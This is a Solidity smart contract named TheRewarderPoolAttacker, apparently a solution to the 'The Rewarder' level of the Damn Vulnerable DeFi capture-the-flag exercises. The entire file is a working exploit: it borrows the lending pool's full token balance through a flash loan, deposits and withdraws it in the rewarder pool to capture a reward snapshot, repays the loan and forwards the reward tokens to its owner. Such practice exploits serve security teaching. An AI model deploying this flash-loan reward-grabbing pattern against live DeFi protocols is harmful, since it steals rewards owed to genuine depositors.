// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";

contract TheRewarderPoolAttacker {
    FlashLoanerPool public immutable pool;
    DamnValuableToken public immutable DVT;
    TheRewarderPool public immutable rewarderPool;
    RewardToken public immutable RT;

    address public immutable owner;

    constructor(
        address _pool,
        address _DVT,
        address _rewarderPool,
        address _RT
    ) {
        pool = FlashLoanerPool(_pool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        DVT = DamnValuableToken(_DVT);
        RT = RewardToken(_RT);
        owner = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) public {
        DVT.approve(address(rewarderPool), amount);

        rewarderPool.deposit(amount);

        rewarderPool.withdraw(amount);

        DVT.transfer(address(pool), amount);

        uint256 balanceOfRT = RT.balanceOf(address(this));
        RT.transfer(owner, balanceOfRT);
    }

    function attack() public {
        uint256 maxBalanceOfPool = DVT.balanceOf(address(pool));
        pool.flashLoan(maxBalanceOfPool);
    }
}
